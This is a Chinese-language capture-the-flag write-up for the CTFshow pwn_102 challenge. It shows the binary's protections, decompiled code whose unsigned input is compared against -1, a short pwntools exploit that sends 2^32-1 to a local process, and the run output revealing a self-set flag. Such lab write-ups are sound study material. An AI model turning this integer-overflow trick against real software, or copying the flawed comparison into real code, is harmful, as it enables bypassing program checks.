# CTFshow-pwn_102
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数溢出
## 解题思路
> 有符号补码变为无符号形式

保护全开
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_102
[*] '/home/mrw/CTFshow/pwn_102'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
程序主函数伪代码如下  
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  puts("Maybe these help you:");
  useful();
  v4 = 0;
  printf("Enter an unsigned integer: ");
  __isoc99_scanf("%u", &v4);
  if ( v4 == -1 )
    gift(); // 获取根目录flag
  else
    printf("Number = %u\n", v4);
  return 0;
}
```
根据`无符号整型最大值 - 有符号补码绝对值 = 无符号形式补码值`  
`signed int`型的`-1`对应的`unsigned int`是`-1 + 2^32`  
**exp 如下**  
```python
from pwn import *
p = process('./pwn_102')
p.sendline(str(2**32-1).encode())
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_102.py 
[+] Starting local process './pwn_102': pid 5835
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Integer_Overflow                                        
    * Site  : https://ctf.show/                                       
    * Hint  : Learn something first !                                 
    * *************************************                           
Maybe these help you:
 ====================================================================================================
           Type         |      Byte      |                          Range                            
 ====================================================================================================
      short int         |     2 byte     |                  0~0x7fff 0x8000~0xffff                   
   unsigned short int   |     2 byte     |                        0~0xffff                           
          int           |     4 byte     |             0~0x7fffffff 0x80000000~0xffffffff            
    unsigned int        |     4 byte     |                        0~0xffffffff                       
      long int          |     8 byte     | 0~0x7fffffffffffffff 0x8000000000000000~0xffffffffffffffff
   unsigned long int    |     8 byte     |                    0~0xffffffffffffffff                   
 ====================================================================================================
Enter an unsigned integer: This is the second question of this type
Here is you want:
flag{Success!}
[*] Got EOF while reading in interactive


```
